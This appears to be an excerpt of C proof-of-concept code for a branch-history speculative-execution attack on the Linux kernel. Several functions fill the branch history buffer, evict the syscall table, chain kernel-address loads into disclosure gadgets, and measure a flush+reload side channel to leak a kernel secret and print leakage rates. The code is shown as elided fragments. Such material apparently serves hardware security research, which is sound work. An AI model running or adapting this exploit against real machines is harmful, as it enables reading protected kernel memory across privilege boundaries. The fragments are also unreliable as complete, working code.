...
void set_load_chain_simple_touch(struct config * cfg, int number_of_loads) {
    ...
    cfg->tfp_arg = 0;
    cfg->tfp_gadget_arg = 0;
    cfg->gadget_arg = 0;
    cfg->gadget_arg_test = 0;
    ...
    case 1:
        ...
        cfg->tfp_arg = cfg->fr_buf_kern - 0x18;
        break;

    case 2:
        cfg->do_second_tfp = 0;

        cfg->tfp_arg = cfg->ind_map_kern + 0x38;
        *(uint64_t *)(cfg->ind_map + 0x50) = (uint64_t)cfg->tfp_leak_target;

        cfg->tfp_gadget_arg = cfg->fr_buf_kern - 0x8;
    ...
    case 3:
        ...
        *(uint64_t *)(cfg->ind_map + 0x50) = (uint64_t)cfg->tfp_leak_target;
        ...
        cfg->tfp_gadget_arg = cfg->ind_map_kern;
...
void set_load_chain_simple_touch_2stage(struct config * cfg, int number_of_loads) {
    ...
    case 1:
        cfg->do_second_tfp = 1;
        cfg->gadget_arg_test = cfg->fr_buf_kern - 0x18;

        break;

    case 2:
        // Second colliding phase, single touch
        cfg->do_second_tfp = 1;
...
void set_load_chain_leak_secret(struct config * cfg)
{
    ...
    //    mov    rax,QWORD PTR [rax+0x60]
    //    mov    rbp,rsp
    //    mov    rdx,QWORD PTR [rax+0x58]   > secret address
    //    mov    rax,QWORD PTR [rcx+0x60]   > base
    //    test   rdx,rdx
    //    je     0xffffffff9b7c9aa4
    //    movsxd rdx,DWORD PTR [rdx+0x9c]
    //    add    rdx,0x44
...
uint64_t do_flush_and_reload(struct config * cfg, uint64_t iterations, uint8_t ret_on_hit) {
    ...
    *(volatile uint64_t *)(cfg->ind_map + 0x40);
    ...
    for(int i=0; i < iterations; i++) {
        ...
        for (size_t i = 0; i < (cfg->do_second_tfp + 1); i++)
        {
            assert(static_fill_bhb_sys(SYS_pread64, cfg->fd, (uint64_t) read_buf, 32, 0) > 0);
            assert(static_fill_bhb_sys(SYS_pread64, cfg->fd, (uint64_t) read_buf, 32, 0) > 0);

            evict_sys_call_table();

            fill_bhb(cfg->history, VICTIM_SYSCALL, (uint64_t)cfg->tfp_arg, (uint64_t) cfg->tfp_gadget_arg , 0, 0); // m_show
        }

        if (cfg->do_second_tfp) {
            evict_sys_call_table();

            fill_bhb(cfg->history_second, VICTIM_SYSCALL, (uint64_t) cfg->gadget_arg_test, (uint64_t) cfg->gadget_arg , 0, 0);
        }
...
void print_leakage_rate(struct config * cfg, uint64_t iterations) {
    ...
    for (size_t iter = 0; iter < 4; iter++)
    {
        ...
        cfg->tfp_gadget_arg = cfg->ind_map_kern - 0x8;
        cfg->do_second_tfp = 0;
...
void print_leakage_rate_2stage(struct config * cfg, uint64_t iterations) {

    uint64_t hits = 0;
    cfg->reload_addr = cfg->fr_buf;

    printf("%-14s| %-14s| %-14s|\n", "2stage + 2 LDS",
                    "2stage + 3 LDS", "SECRET TRANS.");


    for (size_t iter = 0; iter < 4; iter++)
    {

        for (int l = 1; l < NLOADS; l++)
        {
            set_load_chain_simple_touch_2stage(cfg, l + 1);
